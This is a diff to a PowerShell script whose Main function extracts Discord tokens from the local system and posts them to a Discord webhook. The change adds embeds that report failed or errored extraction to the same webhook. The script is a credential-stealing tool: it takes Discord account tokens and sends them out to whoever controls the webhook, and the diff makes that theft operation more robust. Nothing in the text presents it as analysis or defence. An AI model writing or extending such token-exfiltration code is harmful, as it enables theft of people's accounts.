@@ -726,8 +726,28 @@ Function Main {
                 Send-DiscordEmbed -Embed $embed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
             }
         }
+        else {
+            # Send fail message when no tokens are found
+            $failEmbed = @{
+                title = "❌ Token Extraction Failed"
+                description = "No Discord tokens were found on this system."
+                color = 0xff0000
+                footer = @{ text = "Token extraction completed" }
+                timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+            }
+            Send-DiscordEmbed -Embed $failEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
+        }
     }
     catch {
+        # Send fail message when an error occurs
+        $errorEmbed = @{
+            title = "❌ Token Extraction Error"
+            description = "An error occurred during token extraction: $($_.Exception.Message)"
+            color = 0xff0000
+            footer = @{ text = "Token extraction failed" }
+            timestamp = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+        }
+        Send-DiscordEmbed -Embed $errorEmbed -webhookUrl $webhookUrl -username $username -avatar_url $avatar_url
         Write-Error "Failed to extract Discord tokens: $_"
     }
 }
